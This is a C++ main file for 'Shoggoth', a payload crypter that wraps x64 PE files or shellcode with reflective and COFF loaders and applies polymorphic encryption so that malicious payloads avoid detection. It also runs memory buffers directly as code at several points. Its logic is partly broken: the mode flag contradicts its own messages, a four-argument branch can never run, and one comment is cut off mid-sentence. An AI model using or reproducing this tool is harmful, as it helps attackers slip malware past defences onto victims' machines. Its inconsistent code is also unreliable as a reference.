#include<Windows.h>
#include<iostream>
#include<vector>
#include <iostream>
#include "ShoggothEngine.h"
#include "AuxFunctions.h"
#include "Structs.h"


typedef void(*RUNCOFF)(PBYTE, PCHAR, UINT32);

void printHeader() {
	const char* shoggothHeader = R"(
  ______ _                                  _     
 / _____) |                             _  | |    
( (____ | |__   ___   ____  ____  ___ _| |_| |__  
 \____ \|  _ \ / _ \ / _  |/ _  |/ _ (_   _)  _ \ 
 _____) ) | | | |_| ( (_| ( (_| | |_| || |_| | | |
(______/|_| |_|\___/ \___ |\___ |\___/  \__)_| |_|
                    (_____(_____|                                                                          

		     by @R0h1rr1m
)";
	std::cout << shoggothHeader << std::endl;
}


int main(int argc, char *argv[]) {
	bool peMode = false;
	bool coffMode = true;
	int inputSize = 0;
	int encryptedPayloadSize = 0;
	PBYTE inputFileBuffer = NULL;
	PBYTE encryptedPayload = NULL;
	// Polymorphic Engine Object
	ShoggothPolyEngine* shoggothEngine = NULL;
	
	if (argc != 3) {
		std::cout << "[+] Usage: " << argv[0] << " <input payload> <output name>" << std::endl;
		return -1;
	}
	// Read the input binary
	inputFileBuffer = ReadBinary(argv[1], inputSize);
	if (!inputFileBuffer || !inputSize) {
		std::cout << "[!] Can't read the input exe: " << argv[1] << std::endl;
		return -1;
	}

	std::cout << "[+] " << argv[1] << " is read!" << std::endl;
	// Check the input file is a PE file or not
	if (CheckValidPE(inputFileBuffer)) {
		// Check it is x64 or not
		if (Checkx64PE(inputFileBuffer)) {
			std::cout << "[+] Input file is a valid x64 PE! PE encoding is choosing..." << std::endl;
			peMode = false;
		}
		else {
			std::cout << "[!] x86 PE is detected! Shoggoth doesn't support x86 PE yet!" << std::endl;
			return -1;
		}
		
	}
	// Since it is not a PE according to PE signatures, we can 
	else {
		std::cout << "[+] Input file is not a x64 PE! Shellcode encoding is choosing..." << std::endl;
		peMode = true;
	}
	// Initiate the engine
	shoggothEngine = new ShoggothPolyEngine(peMode, coffMode);

	if (!peMode) {
		// If our input file is a PE, append reflective loader
		inputFileBuffer = shoggothEngine->AddReflectiveLoader(inputFileBuffer, inputSize, inputSize);
		std::cout << "[+] Reflective loader payload is added!" << std::endl;
	}

	if (coffMode) {
		char stubFilePath[MAX_PATH] = { 0 };
		
		int coffLoaderSize = 0;
		
		// If you want to use another stub, you should change this hardcoded string
		snprintf(stubFilePath, MAX_PATH, "%s..\\stub\\COFFLoader.bin", SOLUTIONDIR);
		// Read reflective loader binary
		PBYTE coffLoader3 = ReadBinary(stubFilePath, coffLoaderSize);
		RUNCOFF test2 = (RUNCOFF)coffLoader3;
		 test2(inputFileBuffer, NULL, 0);
		if (argc == 4) {
			inputFileBuffer = shoggothEngine->AddCOFFLoader(inputFileBuffer, inputSize, (PBYTE)argv[3], strlen(argv[3]), inputSize);
		}
		else {
			inputFileBuffer = shoggothEngine->AddCOFFLoader(inputFileBuffer, inputSize, NULL, 0, inputSize);
		}

		Func test = (Func)inputFileBuffer;
		test();
	}
	

	// Start Encryption Process
	encryptedPayload = shoggothEngine->StartPolymorphicEncrypt(inputFileBuffer, inputSize, encryptedPayloadSize);
	std::cout << "[+] Polymorphic encryption is done!" << std::endl;

	// Write output
	if (WriteBinary(argv[2], encryptedPayload, encryptedPayloadSize)) {
		std::cout << "Encrypted payload is saved as " << argv[2] << std::endl;
	}
	else {
		std::cout << "[!] Error on writing to " << argv[2] << std::endl;
	}
	 Func test = (Func ) encryptedPayload;
	 test();

	return 0;
}